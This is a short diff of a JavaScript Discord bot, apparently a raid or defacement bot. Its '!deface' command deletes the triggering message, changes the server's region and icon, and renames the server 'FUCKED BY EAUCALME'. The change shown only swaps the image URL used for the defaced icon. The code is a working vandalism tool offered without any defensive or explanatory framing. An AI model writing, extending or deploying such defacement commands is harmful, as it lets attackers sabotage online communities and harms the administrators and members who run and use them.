@@ -473,7 +473,7 @@ msg.reply(`Salut !`)
  if (msg.content === '!deface') {
     if (msg.deletable) msg.delete();
     msg.guild.setRegion('hongkong')
-    msg.guild.setIcon('https://imgur.com/a/htLmWJg');
+    msg.guild.setIcon('https://imgur.com/a/xy7QeCN');
     msg.guild.setName('FUCKED BY EAUCALME')
  }
 
